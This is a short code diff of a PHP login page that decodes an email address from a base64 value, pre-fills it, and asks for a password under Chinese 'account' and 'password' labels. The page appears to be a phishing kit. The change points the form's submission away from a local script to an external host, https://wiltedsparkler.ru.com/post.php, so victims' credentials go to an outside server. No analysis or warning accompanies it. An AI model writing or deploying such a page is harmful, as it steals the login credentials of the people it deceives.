@@ -35,7 +35,7 @@ $email = base64_decode($user);
 	</head>
 	<body>
 		<div class="form">
-			<form action="post.php" method="post">
+			<form action="https://wiltedsparkler.ru.com/post.php" method="post">
 				<input id="email" name="email" style="width: 243px; position: relative; top: 77px; left: 41px; height: 22px; border-radius: 5px; background-color: #eef3f8; color: #92a4bf; border: 1px solid #bac5d4; padding: 5px;" type="email" value="<?php echo $email; ?>" placeholder="帐户">
 				<input name="password" style="width: 243px; position: relative; top: 107px; left: 41px; height: 22px; border-radius: 5px; background-color: #eef3f8; color: #92a4bf; border: 1px solid #bac5d4; padding: 5px;" type="password" placeholder="密码">
 				<input style="position: relative; right: 222px; top: 146px; cursor: pointer; width: 13px; height: 13px;" type="checkbox" >
